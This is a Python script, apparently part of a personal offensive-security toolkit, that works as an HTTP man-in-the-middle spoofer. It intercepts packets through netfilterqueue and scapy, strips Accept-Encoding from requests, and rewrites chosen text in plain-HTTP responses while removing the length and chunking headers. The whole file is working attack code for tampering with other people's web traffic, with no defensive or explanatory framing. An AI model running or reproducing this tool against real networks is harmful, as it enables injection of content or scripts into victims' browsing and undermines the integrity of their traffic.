#!/usr/bin/env python3

import re
import sys
import argparse
import netfilterqueue
import scapy.all as scapy
from modules.my_utils import show_message
from modules.exit_handler import setup_signal_handler
from modules.sys_utils import check_root, setup_nfqueue

### Classes ####################################

class SpooferHTTP:

    def __init__(self, original_text, replace_text):
        self.original_text = original_text.encode()
        self.replace_text = replace_text.encode()


    def set_load(self, packet, load):
        packet[scapy.Raw].load = load

        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum

        return packet

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())

        try:

            if scapy_packet[scapy.TCP].dport == 80:
                modified_load = re.sub(b"Accept-Encoding:.*?\\r\\n", b"", scapy_packet[scapy.Raw].load)
                new_packet = self.set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())

            elif scapy_packet[scapy.TCP].sport == 80:
                # show_message("Respuesta:", "minus")
                modified_load = scapy_packet[scapy.Raw].load.replace(self.original_text, self.replace_text)
                modified_load = re.sub(b"Content-Length: \\d+\\r\\n", b"", modified_load)
                modified_load = re.sub(b"Transfer-Encoding: chunked\\r\\n", b"", modified_load)
                new_packet = self.set_load(scapy_packet, modified_load)
                packet.set_payload(new_packet.build())
                # print(scapy_packet.show())

        except:
            pass

        packet.accept()

### Functions #############################################################################################################

def get_arguments():
    parser = argparse.ArgumentParser(description='HTTP Spoofer')
    parser.add_argument('-t', '--text-original', dest='text_original', required=True, help='Text a substituir')
    parser.add_argument('-r', '--text-replace', dest='text_replace', required=True, help='Text substitut')
    
    options = parser.parse_args()
    return options

### Main Code #############################################################################################################

def main():
    check_root()
    args = get_arguments()

    show_message("Executing: ", "info", "HTTP Spoofer")
    setup_signal_handler()

    spoofer = SpooferHTTP(args.text_original, args.text_replace)

    setup_nfqueue()

    queue = netfilterqueue.NetfilterQueue()
    # Bind to the instance method with a lambda to pass the packet
    queue.bind(0, lambda packet: spoofer.process_packet(packet))
    queue.run()
    
if __name__ == "__main__":
    main()
